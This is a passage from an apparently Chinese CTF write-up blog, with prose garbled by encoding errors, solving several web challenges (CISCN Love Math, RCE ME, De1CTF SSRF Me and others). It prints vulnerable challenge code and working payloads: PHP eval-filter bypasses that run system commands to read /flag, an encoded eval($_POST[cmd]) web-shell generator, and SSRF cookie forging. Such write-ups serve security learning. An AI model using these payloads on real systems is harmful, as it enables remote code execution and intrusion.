</span></span><span style=display:flex><span>            head <span style=color:#f92672>=</span> mid <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            tail <span style=color:#f92672>=</span> mid
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        mid <span style=color:#f92672>=</span> (head <span style=color:#f92672>+</span> tail) <span style=color:#f92672>//</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>+=</span> chr(mid)
</span></span><span style=display:flex><span>    print(flag)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> head <span style=color:#f92672>==</span> <span style=color:#ae81ff>32</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span></code></pre></div><h2 id=bsidescf-2019futurella>[BSidesCF 2019]Futurella</h2><p>ç›´æ¥çœ‹æºç </p><h2 id=ciscn-2019-åˆèµ›love-math>[CISCN 2019 åˆèµ›]Love Math</h2><pre tabindex=0><code>&lt;?php
error_reporting(0);
//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag
if(!isset($_GET[&#39;c&#39;])){
    show_source(__FILE__);
}else{
    //ä¾‹å­ c=20-1
    $content = $_GET[&#39;c&#39;];
    if (strlen($content) &gt;= 80) {
        die(&#34;å¤ªé•¿äº†ä¸ä¼šç®—&#34;);
    }
    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&#34;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];
    foreach ($blacklist as $blackitem) {
        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) {
            die(&#34;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&#34;);
        }
    }
    //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die(&#34;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&#34;);
        }
    }
    //å¸®ä½ ç®—å‡ºç­”æ¡ˆ
    eval(&#39;echo &#39;.$content.&#39;;&#39;);
}
</code></pre><h3 id=0x01>0x01</h3><p>å·²çŸ¥çš„æ˜¯phpå¯ä»¥è¿›è¡ŒåµŒå¥—æ¯”å¦‚è¯´</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>$orange=&#39;system&#39;;$orange(&#39;cat /flag&#39;);
</span></span><span style=display:flex><span>å®é™…å°±æ˜¯æ‰§è¡Œsystem(&#39;cat /flag&#39;);
</span></span></code></pre></div><p>æ‰€ä»¥å¯ä»¥å°è¯•è¿›è¡Œ</p><pre tabindex=0><code>?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag
</code></pre><p>aå’Œbä¸èƒ½ç”¨å¯ä»¥ç”¨å‡½æ•°ä»£æ›¿</p><pre tabindex=0><code>?c=($_GET[pi])($_GET[abs])&amp;pi=system&amp;abs=cat /flag
</code></pre><p>æœ‰ä¸ªè€ç”Ÿå¸¸è°ˆçš„å‡½æ•°hex2binå°†åå…­è¿›åˆ¶è¿›è¡Œè½¬åŒ–ä¸ºASCIIï¼Œ_GETçš„åå…­è¿›åˆ¶æ˜¯<code>5f474554</code>,ä½†æ˜¯ä¹Ÿæ²¡æœ‰hex2binï¼Œä¹Ÿä¸èƒ½å¡«è¿™äº›ä½†æ˜¯é‡Œé¢æœ‰ä¸ªå‡½æ•°æ˜¯<code>base_convert</code>ï¼Œå¯ä»¥ç”¨è¿™ä¸ªå‡½æ•°æ„é€ hex2binï¼Œ36è¿›åˆ¶åŒ…å«0-9å’ŒA-Z,è½¬åŒ–ä¸ºåè¿›åˆ¶å°±æ˜¯<code>37907361743</code></p><pre tabindex=0><code>base_convert(37907361743,10,36)  #æ„é€ å‡ºhex2bin
</code></pre><p>å†åˆ©ç”¨å‡½æ•°<code>dechex</code>å‡½æ•°åè¿›åˆ¶è½¬åŒ–ä¸ºåå…­è¿›åˆ¶<code>1598506324</code>,æ„é€ çš„æµç¨‹å¦‚ä¸‹</p><pre tabindex=0><code>base_convert(37907361743,10,36)(dechex(1598506324));
--&gt; hex2bin(dechex(1598506324));
--&gt; hex2bin(5f474554);
--&gt; _GET
</code></pre><p>æœ€åæ„é€ payload</p><pre tabindex=0><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=tac /flag;
</code></pre><p><code>($_GET){pi}(($_GET){abs})</code>ç„¶åä¼ å…¥å†…å®¹æ‰§è¡Œä»£ç </p><h3 id=0x02>0x02</h3><p>åŸé¢˜ä¹Ÿå¯ä»¥åˆ©ç”¨<code>getallheaders</code>,ä½†æ˜¯æœ¬é¢˜çš„ç¯å¢ƒæœ‰äº›å˜åŒ–</p><h3 id=0x03>0x03</h3><p>å…ˆä¸Špayloadï¼Œçœ‹çœ‹å¤§ä½¬çš„æ€è·¯</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>?</span><span style=color:#a6e22e>c</span><span style=color:#f92672>=</span>$pi<span style=color:#f92672>=</span>(<span style=color:#a6e22e>is_nan</span><span style=color:#f92672>^</span>(<span style=color:#ae81ff>6</span>)<span style=color:#f92672>.</span>(<span style=color:#ae81ff>4</span>))<span style=color:#f92672>.</span>(<span style=color:#a6e22e>tan</span><span style=color:#f92672>^</span>(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>(<span style=color:#ae81ff>5</span>));$pi<span style=color:#f92672>=</span>$$pi;$pi{<span style=color:#ae81ff>0</span>}($pi{<span style=color:#ae81ff>1</span>})<span style=color:#f92672>&amp;</span><span style=color:#ae81ff>0</span><span style=color:#f92672>=</span><span style=color:#a6e22e>system</span><span style=color:#f92672>&amp;</span><span style=color:#ae81ff>1</span><span style=color:#f92672>=</span><span style=color:#a6e22e>tac</span> <span style=color:#f92672>/</span><span style=color:#a6e22e>flag</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$payload <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;abs&#39;</span>, <span style=color:#e6db74>&#39;acos&#39;</span>, <span style=color:#e6db74>&#39;acosh&#39;</span>, <span style=color:#e6db74>&#39;asin&#39;</span>, <span style=color:#e6db74>&#39;asinh&#39;</span>, <span style=color:#e6db74>&#39;atan2&#39;</span>, <span style=color:#e6db74>&#39;atan&#39;</span>, <span style=color:#e6db74>&#39;atanh&#39;</span>,  <span style=color:#e6db74>&#39;bindec&#39;</span>, <span style=color:#e6db74>&#39;ceil&#39;</span>, <span style=color:#e6db74>&#39;cos&#39;</span>, <span style=color:#e6db74>&#39;cosh&#39;</span>, <span style=color:#e6db74>&#39;decbin&#39;</span> , <span style=color:#e6db74>&#39;decoct&#39;</span>, <span style=color:#e6db74>&#39;deg2rad&#39;</span>, <span style=color:#e6db74>&#39;exp&#39;</span>, <span style=color:#e6db74>&#39;expm1&#39;</span>, <span style=color:#e6db74>&#39;floor&#39;</span>, <span style=color:#e6db74>&#39;fmod&#39;</span>, <span style=color:#e6db74>&#39;getrandmax&#39;</span>, <span style=color:#e6db74>&#39;hexdec&#39;</span>, <span style=color:#e6db74>&#39;hypot&#39;</span>, <span style=color:#e6db74>&#39;is_finite&#39;</span>, <span style=color:#e6db74>&#39;is_infinite&#39;</span>, <span style=color:#e6db74>&#39;is_nan&#39;</span>, <span style=color:#e6db74>&#39;lcg_value&#39;</span>, <span style=color:#e6db74>&#39;log10&#39;</span>, <span style=color:#e6db74>&#39;log1p&#39;</span>, <span style=color:#e6db74>&#39;log&#39;</span>, <span style=color:#e6db74>&#39;max&#39;</span>, <span style=color:#e6db74>&#39;min&#39;</span>, <span style=color:#e6db74>&#39;mt_getrandmax&#39;</span>, <span style=color:#e6db74>&#39;mt_rand&#39;</span>, <span style=color:#e6db74>&#39;mt_srand&#39;</span>, <span style=color:#e6db74>&#39;octdec&#39;</span>, <span style=color:#e6db74>&#39;pi&#39;</span>, <span style=color:#e6db74>&#39;pow&#39;</span>, <span style=color:#e6db74>&#39;rad2deg&#39;</span>, <span style=color:#e6db74>&#39;rand&#39;</span>, <span style=color:#e6db74>&#39;round&#39;</span>, <span style=color:#e6db74>&#39;sin&#39;</span>, <span style=color:#e6db74>&#39;sinh&#39;</span>, <span style=color:#e6db74>&#39;sqrt&#39;</span>, <span style=color:#e6db74>&#39;srand&#39;</span>, <span style=color:#e6db74>&#39;tan&#39;</span>, <span style=color:#e6db74>&#39;tanh&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span>($k<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>;$k<span style=color:#f92672>&lt;=</span><span style=color:#a6e22e>sizeof</span>($payload);$k<span style=color:#f92672>++</span>){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span>($i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;$i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>9</span>; $i<span style=color:#f92672>++</span>){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span>($j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;$j <span style=color:#f92672>&lt;=</span><span style=color:#ae81ff>9</span>;$j<span style=color:#f92672>++</span>){
</span></span><span style=display:flex><span>            $exp <span style=color:#f92672>=</span> $payload[$k] <span style=color:#f92672>^</span> $i<span style=color:#f92672>.</span>$j;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span>($payload[$k]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;^</span><span style=color:#e6db74>$i$j</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#34;==&gt;</span><span style=color:#e6db74>$exp</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br /&gt;&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>è¿™ä¸ªè„šæœ¬é€šè¿‡å¼‚æˆ–å¯ä»¥ç”Ÿæˆå¾ˆå¤šçš„å­—ç¬¦ï¼Œæ‹¼æ¥æœ€åå°±å¯ä»¥å¾—åˆ°payloadæ¶¨çŸ¥è¯†äº†</p><h2 id=æå®¢å¤§æŒ‘æˆ˜-2019rce-me>æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;code&#39;</span>])){
</span></span><span style=display:flex><span>            $code<span style=color:#f92672>=</span>$_GET[<span style=color:#e6db74>&#39;code&#39;</span>];
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strlen</span>($code)<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>40</span>){
</span></span><span style=display:flex><span>                                        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;This is too Long.&#34;</span>);
</span></span><span style=display:flex><span>                                                }
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/[A-Za-z0-9]+/&#34;</span>,$code)){
</span></span><span style=display:flex><span>                                        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;NO.&#34;</span>);
</span></span><span style=display:flex><span>                                                }
</span></span><span style=display:flex><span>                    <span style=color:#f92672>@</span><span style=color:#66d9ef>eval</span>($code);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// ?&gt;
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$a<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;assert&#34;</span>;
</span></span><span style=display:flex><span>$b<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;(eval(</span><span style=color:#ae81ff>\$</span><span style=color:#e6db74>_POST[cmd]))&#34;</span>;
</span></span><span style=display:flex><span>$c<span style=color:#f92672>=</span><span style=color:#a6e22e>urlencode</span>(<span style=color:#f92672>~</span>$a);
</span></span><span style=display:flex><span>$d<span style=color:#f92672>=</span><span style=color:#a6e22e>urlencode</span>(<span style=color:#f92672>~</span>$b);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> (<span style=color:#e6db74>&#34;?code=(~&#34;</span><span style=color:#f92672>.</span>$c<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;)(~&#34;</span><span style=color:#f92672>.</span>$d<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;);&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>èšå‰‘ç”¨æ’ä»¶è¿æ‰§è¡Œ</p><p>æˆ–è€…ç”¨LDåŠ«æŒ</p><h2 id=de1ctf-2019ssrf-me>[De1CTF 2019]SSRF Me</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#! /usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#75715e># encoding=utf-8</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, request
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> socket
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> urllib
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>reload(sys)
</span></span><span style=display:flex><span>sys<span style=color:#f92672>.</span>setdefaultencoding(<span style=color:#e6db74>&#39;latin1&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
</span></span><span style=display:flex><span>secert_key <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>urandom(<span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Task</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self, action, param, sign, ip):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>action <span style=color:#f92672>=</span> action
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>param <span style=color:#f92672>=</span> param
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>sign <span style=color:#f92672>=</span> sign
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>sandbox <span style=color:#f92672>=</span> md5(ip)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>exists(self<span style=color:#f92672>.</span>sandbox):
</span></span><span style=display:flex><span>            os<span style=color:#f92672>.</span>mkdir(self<span style=color:#f92672>.</span>sandbox)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>Exec</span>(self):
</span></span><span style=display:flex><span>        result <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span>        result[<span style=color:#e6db74>&#39;code&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>500</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> self<span style=color:#f92672>.</span>checkSign():
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;scan&#34;</span> <span style=color:#f92672>in</span> self<span style=color:#f92672>.</span>action:
</span></span><span style=display:flex><span>                tmpfile <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;./</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>/result.txt&#34;</span> <span style=color:#f92672>%</span> self<span style=color:#f92672>.</span>sandbox, <span style=color:#e6db74>&#39;w&#39;</span>)
</span></span><span style=display:flex><span>                resp <span style=color:#f92672>=</span> scan(self<span style=color:#f92672>.</span>param)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> resp <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;Connection Timeout&#34;</span>:
</span></span><span style=display:flex><span>                    result[<span style=color:#e6db74>&#39;data&#39;</span>] <span style=color:#f92672>=</span> resp
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                    print resp
</span></span><span style=display:flex><span>                    tmpfile<span style=color:#f92672>.</span>write(resp)
</span></span><span style=display:flex><span>                tmpfile<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>                result[<span style=color:#e6db74>&#39;code&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>200</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;read&#34;</span> <span style=color:#f92672>in</span> self<span style=color:#f92672>.</span>action:
</span></span><span style=display:flex><span>                f <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;./</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>/result.txt&#34;</span> <span style=color:#f92672>%</span> self<span style=color:#f92672>.</span>sandbox, <span style=color:#e6db74>&#39;r&#39;</span>)
</span></span><span style=display:flex><span>                result[<span style=color:#e6db74>&#39;code&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>200</span>
</span></span><span style=display:flex><span>                result[<span style=color:#e6db74>&#39;data&#39;</span>] <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> result[<span style=color:#e6db74>&#39;code&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#ae81ff>500</span>:
</span></span><span style=display:flex><span>                result[<span style=color:#e6db74>&#39;data&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Action Error&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            result[<span style=color:#e6db74>&#39;code&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>500</span>
</span></span><span style=display:flex><span>            result[<span style=color:#e6db74>&#39;msg&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Sign Error&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> result
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>checkSign</span>(self):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> getSign(self<span style=color:#f92672>.</span>action, self<span style=color:#f92672>.</span>param) <span style=color:#f92672>==</span> self<span style=color:#f92672>.</span>sign
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/geneSign&#34;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>geneSign</span>():
</span></span><span style=display:flex><span>    param <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>unquote(request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;param&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>))
</span></span><span style=display:flex><span>    action <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;scan&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> getSign(action, param)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/De1ta&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>challenge</span>():
</span></span><span style=display:flex><span>    action <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>unquote(request<span style=color:#f92672>.</span>cookies<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;action&#34;</span>))
</span></span><span style=display:flex><span>    param <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>unquote(request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;param&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>))
</span></span><span style=display:flex><span>    sign <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>unquote(request<span style=color:#f92672>.</span>cookies<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;sign&#34;</span>))
</span></span><span style=display:flex><span>    ip <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>remote_addr
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> waf(param):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;No Hacker!!!!&#34;</span>
</span></span><span style=display:flex><span>    task <span style=color:#f92672>=</span> Task(action, param, sign, ip)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> json<span style=color:#f92672>.</span>dumps(task<span style=color:#f92672>.</span>Exec())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> open(<span style=color:#e6db74>&#34;code.txt&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>)<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>scan</span>(param):
</span></span><span style=display:flex><span>    socket<span style=color:#f92672>.</span>setdefaulttimeout(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> urllib<span style=color:#f92672>.</span>urlopen(param)<span style=color:#f92672>.</span>read()[:<span style=color:#ae81ff>50</span>]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Connection Timeout&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getSign</span>(action, param):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> hashlib<span style=color:#f92672>.</span>md5(secert_key <span style=color:#f92672>+</span> param <span style=color:#f92672>+</span> action)<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>md5</span>(content):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> hashlib<span style=color:#f92672>.</span>md5(content)<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>waf</span>(param):
</span></span><span style=display:flex><span>    check <span style=color:#f92672>=</span> param<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>lower()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> check<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;gopher&#34;</span>) <span style=color:#f92672>or</span> check<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;file&#34;</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>debug <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.0.0&#39;</span>, port<span style=color:#f92672>=</span><span style=color:#ae81ff>80</span>)
</span></span></code></pre></div><pre tabindex=0><code>/geneSign?param=flag.txtread
</code></pre><pre tabindex=0><code>/De1ta?param=flag.txt
Cookie:action=readscan;sign=819ef9a9800ac15546b246d3e41d2154;
</code></pre><h2 id=bjdctf2020easysearch>[BJDCTF2020]EasySearch</h2><p>ä¹Ÿæ˜¯æ‰«ä¸äº†ï¼Œbuuå¹³å°å¤§éƒ¨åˆ†çš„éƒ½ä¼šå¼¹429ï¼Œçœ‹ä¸€ä¸‹é¢˜ç›®</p><pre tabindex=0><code>http://6306a09b-f1f5-46ed-a023-63c63bacb767.node5.buuoj.cn:81/index.php.swp
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>ob_start</span>();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>get_hash</span>(){
</span></span><span style=display:flex><span>		$chars <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;</span>;
